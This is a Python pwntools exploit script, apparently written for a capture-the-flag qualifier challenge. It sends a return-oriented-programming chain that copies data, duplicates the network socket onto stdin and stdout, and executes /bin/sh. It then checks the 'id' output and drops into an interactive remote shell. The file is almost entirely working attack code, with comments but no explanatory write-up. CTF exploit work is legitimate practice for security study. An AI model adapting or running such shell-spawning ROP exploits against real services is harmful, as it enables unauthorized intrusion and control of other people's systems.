from pwn import *
import random
import sys
import time

# exit(0)
# s = remote("awsno_cfeaa78b474521963ccfd450cd938ce9.quals.shallweplayaga.me", 80)
HOST="127.0.0.1"
PORT=9345
#HOST="awsno_cfeaa78b474521963ccfd450cd938ce9.quals.shallweplayaga.me"
#PORT=80

import time

s = None
#pieces = open("log_crash").read().split("__ew connection__\n")
#trigger = open("trigger").read()

POP_RAX_RET = 0x0063177e #: pop rax ; ret  ;  (1 found)
#note this clobbers rax
SUB_RDI_RAX_RET = 0x0068ef0a #: sub rdi, rax ; mov rax, rdi ; ret  ;  (1 found)

#expects rdi to be the path
#expects rsi to be argv array
CALL_EXECVE = 0x6cd21f 
CALL_EXECVE_RSI_FROM_RBP = 0x6cd21c

JMP_WRITE = 0x403BF0 
JMP_DUP2  = 0x4032F0
JMP_MEMCPY = 0x403C70

POP_RDX = 0x0053ae56
POP_RDI = 0x006d0afa
POP_RSI = 0x006c2a0c

nextcon = remote(HOST, PORT)

while True:
  head = "GET /vehicles HTTP/1.0\n\n"
  nextcon.send(head)
  
  if s:
    try:
      data = s.recv(4096*4)
      s.send("uname -a\nid\nid\n")
      time.sleep(0.1)
      data = s.recv(4096*4)
      if 'uid' in data or 'inux' in data:
        print `data`
        s.interactive()
    except:
      pass
    s.close()
  s = nextcon
  
  
  offset = 129
  a = "/bin/sh\x00"*(15)
  a += (p64(0xa01400+offset+16) + p64(0))*7 # array for busybox...
  N = 208
  b = ""
  
  # some randomness in practice here about where we really start, 
  # and shifting. lets go for ret2ret maybe
  for i in range(4):
    if i == 0:
      b += "\x00"*8
    else:
      b += str(i)*8
  
  b = b[:-2]
  
  POP_RDI = 0xaaaaaaaaaaaaaaaa
  b += p64(0xa01501)  #setrbp  to some pointer
  #memcpy(a01400, rsi, 512)
  b += p64(POP_RDI) + p64(0xa01400) + p64(POP_RDX) + p64(512) + p64(JMP_MEMCPY) #copy rsi to 0xa01400
  sockno = 4
  #dup2 sockno, 0; dup2 sockno, 1
  b += p64(POP_RDI) + p64(sockno) + p64(POP_RSI) + p64(0) + p64(JMP_DUP2)
  b += p64(POP_RDI) + p64(sockno) + p64(POP_RSI) + p64(1) + p64(JMP_DUP2)
  #execve on rdi as path now
  #shift = random.randint(0,8)
  b += p64(POP_RDI) + p64(0xa01400 + offset) + p64(CALL_EXECVE_RSI_FROM_RBP)
  
  
  cmds = ["1", "35958", "13118", "-40356", "58030", "1222"]
  cmds += ["1", "-63080", a, b, "24612", "1222"]
  #s.level = 'debug'
  try:
    for line in cmds:
      s.send(line+"\n")
  except:
    pass
  
  time.sleep(0.1)
  nextcon = remote(HOST, PORT)
